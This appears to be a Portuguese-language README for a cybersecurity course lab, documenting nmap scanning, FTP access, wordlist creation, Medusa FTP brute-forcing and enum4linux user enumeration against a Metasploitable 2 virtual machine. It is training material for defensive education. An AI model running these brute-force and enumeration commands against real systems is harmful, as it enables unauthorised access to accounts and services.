# DIOSantander
Projeto Santander Cybersegurança 2025
Utilizado duas VM's contendo o sistema Kali Linux e o sistema Metaesploitable 2, este servindo como sistema alvo das varreduras e tentativas de acesso.
Utilizado os programas nmap para identificar o as portas abertas no host.
Utilizado o programa Medusa para realizar os ataques de brute-force.
Comandos utilizados:
"nmap -sV -p 21,22,80,445,139 192.168.56.101" - testando as portas 21,22,80,445 e 139 para identificar quais estão abertas (acessíveis).
"ftp 192.168.56.101" - utilizado para acesso via ftp ao host
"echo -e "user\nmfsadmin\nadmin\nroot" > users.txt" - Comando usado para criar um arquivo de texto com possíveis usuários do sistema.
"echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt" - Comando usado para criar um arquivo de texto com possíveis senhas parar os usuários do sistema.
"medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6" - Comando usado para iniciar o Medusa, usando o parâmetro -h para setar o IP do host para o qual iremos direcionar o ataque, -U e -P setam os arquivos txt com os nomes de usuários e senhas respectivamente, e -t 6 indicando quantos threads usaremos no ataque.
"enum4linux -a 192.168.56.101 | tee enum4_output.txt" - Comando utilizado para descobrir nomes de usuários em uma varredura.
